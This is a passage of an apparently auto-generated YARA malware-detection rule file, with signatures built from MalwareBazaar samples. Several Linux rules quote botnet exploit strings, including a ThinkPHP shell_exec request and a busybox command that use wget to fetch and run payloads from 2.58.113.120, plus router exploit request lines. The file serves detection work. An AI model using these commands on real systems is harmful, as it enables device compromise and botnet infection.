        uint32(0) == 0x00905a4d and
        filesize < 3721KB and
        all of them
}

rule Windows_bb69773fb9f66bfdf541104d0bcdaa83208c756fad16679eb334c459853897e4
{
    meta:
        description = "Auto ML: bb69773fb9f66bfdf541104d0bcdaa83208c756fad16679eb334c459853897e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 276KB and
        all of them
}

rule Linux_bbb0547890ab42791e6bba722fc959466834535b67be66e8f58b3623d6736e35
{
    meta:
        description = "Auto ML: bbb0547890ab42791e6bba722fc959466834535b67be66e8f58b3623d6736e35"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Ycmdlin"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s3 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB and
        all of them
}

rule Windows_bbb2ad171db12bf6179bad65dcd9eefe42a3f6d756befb9aa3d04948d860c289
{
    meta:
        description = "Auto ML: bbb2ad171db12bf6179bad65dcd9eefe42a3f6d756befb9aa3d04948d860c289"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1270KB and
        all of them
}

rule Windows_bbb41484a215f4bdf278d2fee0ce2581c78468b7163f57bc4846e620275deb45
{
    meta:
        description = "Auto ML: bbb41484a215f4bdf278d2fee0ce2581c78468b7163f57bc4846e620275deb45"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetWindowsVersion>g__HKLM_GetString|11_0"
        $s5 = "<GetScanArgs>b__5_0"
        $s6 = "Microsoft.Win32"
        $s7 = "<GetTokens>d__2"
        $s8 = "<Module>"
        $s9 = "System.Drawing.Drawing2D"
        $s10 = "get_ReleaseID"
        $s11 = "set_ReleaseID"
        $s12 = "get_TaskID"
        $s13 = "set_TaskID"
        $s14 = "get_ASCII"
        $s15 = "get_JSON"
        $s16 = "get_ScanVPN"
        $s17 = "set_ScanVPN"
        $s18 = "System.IO"
        $s19 = "get_BlockedIP"
        $s20 = "set_BlockedIP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 106KB and
        all of them
}

rule Windows_bc09a4abcd910dee1fba2dd17ca4fad999ebd43be50a3c46cd3ae253d594199f
{
    meta:
        description = "Auto ML: bc09a4abcd910dee1fba2dd17ca4fad999ebd43be50a3c46cd3ae253d594199f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s6 = "DeleteFileA"
        $s7 = "FindFirstFileA"
        $s8 = "FindNextFileA"
        $s9 = "FindClose"
        $s10 = "SetFilePointer"
        $s11 = "ReadFile"
        $s12 = "WriteFile"
        $s13 = "GetPrivateProfileStringA"
        $s14 = "WritePrivateProfileStringA"
        $s15 = "GetProcAddress"
        $s16 = "LoadLibraryExA"
        $s17 = "GetModuleHandleA"
        $s18 = "GetExitCodeProcess"
        $s19 = "CloseHandle"
        $s20 = "SetFileTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB and
        all of them
}

rule Windows_bc25f4a5eecfb787a6ec1a10fedfdd917cd186447133e1570cc688d8ea7c5549
{
    meta:
        description = "Auto ML: bc25f4a5eecfb787a6ec1a10fedfdd917cd186447133e1570cc688d8ea7c5549"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "ProcessPH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = ":windu"
        $s17 = "8windu fA"
        $s18 = "8open"
        $s19 = "9fileu"
        $s20 = ">fileuF"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 46822KB and
        all of them
}

rule Windows_bc5bbcae0fe7bce37b744677acb4602b8e2d31f8120aefcf4f648937a0c6e210
{
    meta:
        description = "Auto ML: bc5bbcae0fe7bce37b744677acb4602b8e2d31f8120aefcf4f648937a0c6e210"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "_pSETc;F"
        $s5 = "_pSETc;Fc"
        $s6 = "_pSETc;FR+l %S"
        $s7 = "_pSETc;Fy"
        $s8 = "w_ySET"
        $s9 = "1C_e.a<mksSETIy%KB"
        $s10 = "d_ISET&"
        $s11 = "SETc"
        $s12 = "SETIl}"
        $s13 = "2Q:m]USERI"
        $s14 = "pSETIU'YBkP"
        $s15 = "uSERIy4"
        $s16 = "System.Collections.Generic"
        $s17 = "Thread"
        $s18 = "get_Message"
        $s19 = "GetTypeFromHandle"
        $s20 = "System.Core"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 342KB and
        all of them
}

rule Windows_13735fe34c4fb1fc5efca9336215af08efaeca20859c61409f9fb7c7afc82332
{
    meta:
        description = "Auto ML: 13735fe34c4fb1fc5efca9336215af08efaeca20859c61409f9fb7c7afc82332"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2543KB and
        all of them
}

rule Linux_bc6c9d15af9714ba1398367e91c7d3980c7f18f1359e44f3cb30653839340287
{
    meta:
        description = "Auto ML: bc6c9d15af9714ba1398367e91c7d3980c7f18f1359e44f3cb30653839340287"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 147KB and
        all of them
}

rule Windows_bc72427282ffa8c3a16209daec0648ded710e748a20600d217edfb8de6a582c0
{
    meta:
        description = "Auto ML: bc72427282ffa8c3a16209daec0648ded710e748a20600d217edfb8de6a582c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "get_Panel1"
        $s5 = "get_Panel2"
        $s6 = "<Module>"
        $s7 = "get_TEAM_A"
        $s8 = "System.IO"
        $s9 = "get_Fecha"
        $s10 = "set_Fecha"
        $s11 = "set_UseMnemonic"
        $s12 = "System.Collections.Generic"
        $s13 = "get_Enabled"
        $s14 = "set_Enabled"
        $s15 = "set_FormattingEnabled"
        $s16 = "set_Sorted"
        $s17 = "get_BirthdateFormatted"
        $s18 = "set_BirthdateFormatted"
        $s19 = "get_FlatAppearance"
        $s20 = "set_SplitterDistance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 778KB and
        all of them
}

rule Windows_bc7c7280855c384e5a970a2895363bd5c8db9088977d129b180d3acb1ec9148a
{
    meta:
        description = "Auto ML: bc7c7280855c384e5a970a2895363bd5c8db9088977d129b180d3acb1ec9148a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = "setybdetI1"
        $s5 = "HTTP/1."
        $s6 = "setybdetM1"
        $s7 = "setybdetH"
        $s8 = "setybdetI"
        $s9 = "Map must not be polled after it returned `Poll::Ready`/cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-util-0.3.28/src/future/future/map.rs"
        $s10 = "assertion failed: slot.is_none()/cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-channel-0.3.28/src/oneshot.rs"
        $s11 = "Flatten polled after completion/cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-util-0.3.28/src/future/future/flatten.rs"
        $s12 = "TryFlatten polled after completion/cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-util-0.3.28/src/future/try_future/try_flatten.rs"
        $s13 = "assertion failed: buf.len() <= c::ULONG::MAX as usize/rustc/90c541806f23a127002de5b4038be731ba1458ca\\library\\std\\src\\sys\\windows\\io.rs"
        $s14 = "attempt to divide by zero"
        $s15 = "/cargo/registry/src/index.crates.io-6f17d22bba15001f/hex-0.4.3/src/lib.rs"
        $s16 = "/cargo/registry/src/index.crates.io-6f17d22bba15001f/bytes-1.4.0/src/buf/buf_impl.rs"
        $s17 = "internal error: entered unreachable code: write_body invalid state:"
        $s18 = "PRI * HTTP/2.0"
        $s19 = "internal error: entered unreachable code: poll_read_body invalid state:"
        $s20 = "HTTP/1.1 100 Continue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 715KB and
        all of them
}

rule Windows_bc822ed934731c6843e138a7b5a0f643b6852ee233b0fb861040bd95111d09f5
{
    meta:
        description = "Auto ML: bc822ed934731c6843e138a7b5a0f643b6852ee233b0fb861040bd95111d09f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB and
        all of them
}

rule Windows_bca1b830105b7ffeae00fea5f3a993586d0b85e9e3ef21db6c71757f2ad32dab
{
    meta:
        description = "Auto ML: bca1b830105b7ffeae00fea5f3a993586d0b85e9e3ef21db6c71757f2ad32dab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "GAIsProcessorFeaturePresent"
        $s6 = "KERNEL32"
        $s7 = "- unable to open console device"
        $s8 = "- unexpected multithread lock error"
        $s9 = "- not enough space for thread data"
        $s10 = "- floating point not loaded"
        $s11 = "GetLastActivePopup"
        $s12 = "GetActiveWindow"
        $s13 = "user32.dll"
        $s14 = "GetTickCount"
        $s15 = "GetModuleHandleW"
        $s16 = "KERNEL32.dll"
        $s17 = "SetWindowLongW"
        $s18 = "GetSysColor"
        $s19 = "GetKeyState"
        $s20 = "DefWindowProcW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2429KB and
        all of them
}

rule Windows_bcb2d451f4dfa2303bee79a0ad6b2f060ae508ab7cdd92e6d3f718baf297fca8
{
    meta:
        description = "Auto ML: bcb2d451f4dfa2303bee79a0ad6b2f060ae508ab7cdd92e6d3f718baf297fca8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "CreateActCtxW"
        $s7 = "GetModuleHandleExW"
        $s8 = "Kernel32.dll"
        $s9 = "Comctl32.dll"
        $s10 = "SetDefaultDllDirectories"
        $s11 = "RegisterTouchWindow"
        $s12 = "UnregisterTouchWindow"
        $s13 = "GetTouchInputInfo"
        $s14 = "CloseTouchInputHandle"
        $s15 = "GetGestureInfo"
        $s16 = "CloseGestureInfoHandle"
        $s17 = "CCmdTarget"
        $s18 = "CWinApp"
        $s19 = "COleControlModule"
        $s20 = "RegOpenKeyTransactedW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2316KB and
        all of them
}

rule Windows_bcec8f25d0fcce6b453b9bc363d15b3fa84f2bca0afc7c5bb9f3620386b4dabc
{
    meta:
        description = "Auto ML: bcec8f25d0fcce6b453b9bc363d15b3fa84f2bca0afc7c5bb9f3620386b4dabc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2418KB and
        all of them
}

rule Windows_bd2b3bc973155b2f6b0866245d933619550d127f292cb912e9cea106fb8392a5
{
    meta:
        description = "Auto ML: bd2b3bc973155b2f6b0866245d933619550d127f292cb912e9cea106fb8392a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 817KB and
        all of them
}

rule Windows_bd700d29a293140025aab849bec3b4ecb2fa67574f7efd2ed1dfb19aee3286ea
{
    meta:
        description = "Auto ML: bd700d29a293140025aab849bec3b4ecb2fa67574f7efd2ed1dfb19aee3286ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 600KB and
        all of them
}

rule Windows_bd8646691e2eb4e3467861fc765cfc3a45925243afac513944a922a1100d80bb
{
    meta:
        description = "Auto ML: bd8646691e2eb4e3467861fc765cfc3a45925243afac513944a922a1100d80bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "CWinApp"
        $s7 = "CreateActCtxW"
        $s8 = "GetSystemDefaultUILanguage"
        $s9 = "GetUserDefaultUILanguage"
        $s10 = "NotifyWinEvent"
        $s11 = "CWinThread"
        $s12 = "CCmdTarget"
        $s13 = "CUserException"
        $s14 = "GetMonitorInfoA"
        $s15 = "GetMonitorInfoW"
        $s16 = "MonitorFromWindow"
        $s17 = "GetSystemMetrics"
        $s18 = "CorExitProcess"
        $s19 = "FlsSetValue"
        $s20 = "FlsGetValue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB and
        all of them
}

rule Windows_137d46e5525f910e8a9b13f184fb28c918cccf097d3342a3208db85eb3146554
{
    meta:
        description = "Auto ML: 137d46e5525f910e8a9b13f184fb28c918cccf097d3342a3208db85eb3146554"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 159KB and
        all of them
}

rule Android_bdb84b702752c4065fa36f7c6f7038eed2bfda6d09c32d69512896077b66c097
{
    meta:
        description = "Auto ML: bdb84b702752c4065fa36f7c6f7038eed2bfda6d09c32d69512896077b66c097"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/arctic.attheme}Z]s"
        $s2 = "assets/bluebubbles.attheme}X"
        $s3 = "assets/countries.txt}X"
        $s4 = "assets/currencies.json"
        $s5 = "assets/darkblue.attheme"
        $s6 = "assets/day.attheme}Z"
        $s7 = "assets/emoji/0_0.png"
        $s8 = "assets/emoji/0_1.png"
        $s9 = "assets/emoji/0_10.png"
        $s10 = "assets/emoji/0_100.png"
        $s11 = "assets/emoji/0_1000.png"
        $s12 = "assets/emoji/0_1001.png"
        $s13 = "assets/emoji/0_1002.png"
        $s14 = "assets/emoji/0_1003.png"
        $s15 = "assets/emoji/0_1004.png"
        $s16 = "assets/emoji/0_1005.png"
        $s17 = "assets/emoji/0_1006.png"
        $s18 = "assets/emoji/0_1007.png"
        $s19 = "assets/emoji/0_1008.png"
        $s20 = "assets/emoji/0_1009.png"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 77173KB and
        all of them
}

rule Windows_bdd18149da8dd36475433df59529ff1159969bb23aa34274e9a114e2979dfdc8
{
    meta:
        description = "Auto ML: bdd18149da8dd36475433df59529ff1159969bb23aa34274e9a114e2979dfdc8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "filezzzone"
        $s4 = "filezzzone.exe"
        $s5 = "<Module>"
        $s6 = "TouchSocket.Consumers"
        $s7 = "System"
        $s8 = "TouchSocket.Common"
        $s9 = "TouchSocket.Classes"
        $s10 = "IsReadOnlyAttribute"
        $s11 = "System.Runtime.CompilerServices"
        $s12 = "filezzzone.Dispatcher"
        $s13 = "filezzzone.Maps"
        $s14 = "TouchSocket.Expressions"
        $s15 = "Getter`1"
        $s16 = "TouchSocket.Importers"
        $s17 = "WriterGetterListener`1"
        $s18 = "filezzzone.Listeners"
        $s19 = "filezzzone.Properties"
        $s20 = "filezzzone.Queues"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2797KB and
        all of them
}

rule Linux_bdd2e6994710acc35676b7e8a0fae06759995604314527eed6692cb331b19402
{
    meta:
        description = "Auto ML: bdd2e6994710acc35676b7e8a0fae06759995604314527eed6692cb331b19402"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Windows_bdda2e25de8ae0b35633c5a8648a58d074220327c4f40909ea30519049b868b0
{
    meta:
        description = "Auto ML: bdda2e25de8ae0b35633c5a8648a58d074220327c4f40909ea30519049b868b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1783KB and
        all of them
}

rule Windows_bdf867eab65bb30f2cbe508eecbafb5f7da83a4f0e435490cf0b9bcc8b024860
{
    meta:
        description = "Auto ML: bdf867eab65bb30f2cbe508eecbafb5f7da83a4f0e435490cf0b9bcc8b024860"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "kernel32"
        $s8 = "kernel32.dll"
        $s9 = "wininet.dll"
        $s10 = "user32.dll"
        $s11 = "user32"
        $s12 = "OLEACC.DLL"
        $s13 = "advapi32.dll"
        $s14 = "CloseHandle"
        $s15 = "CreateThread"
        $s16 = "TerminateThread"
        $s17 = "InternetOpenA"
        $s18 = "InternetConnectA"
        $s19 = "HttpOpenRequestA"
        $s20 = "HttpSendRequestA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1420KB and
        all of them
}

rule Windows_be0bf3020e394c001a0b1754ca7e3d708e5973b2bff748c033a14de047cfb9f8
{
    meta:
        description = "Auto ML: be0bf3020e394c001a0b1754ca7e3d708e5973b2bff748c033a14de047cfb9f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadOnlyCollection`1"
        $s5 = "kernel32"
        $s6 = "Microsoft.Win32"
        $s7 = "WriteInt32"
        $s8 = "<Module>"
        $s9 = "CreateDC"
        $s10 = "DeleteDC"
        $s11 = "get_ASCII"
        $s12 = "System.IO"
        $s13 = "CreateFileTransactedW"
        $s14 = "CreateFileW"
        $s15 = "GetFileAttributesW"
        $s16 = "GetFileAttributesExW"
        $s17 = "UploadData"
        $s18 = "set_Verb"
        $s19 = "GetHdc"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2460KB and
        all of them
}

rule Linux_be36029eb1545971fda31a593cfcd69f2ff196d207369da6df8bb20e8422055f
{
    meta:
        description = "Auto ML: be36029eb1545971fda31a593cfcd69f2ff196d207369da6df8bb20e8422055f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "|G&!q"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 36KB and
        all of them
}

rule Windows_bea42a753715b080ac6a74256cd563aef533f837b9dd45797d50c99d2af989fd
{
    meta:
        description = "Auto ML: bea42a753715b080ac6a74256cd563aef533f837b9dd45797d50c99d2af989fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "AssemblyKeyFileAttribute"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "System.Runtime.InteropServices"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "fcPh.exe"
        $s14 = "<Module>"
        $s15 = "System.Windows.Forms"
        $s16 = "Settings"
        $s17 = "ApplicationSettingsBase"
        $s18 = "System.Configuration"
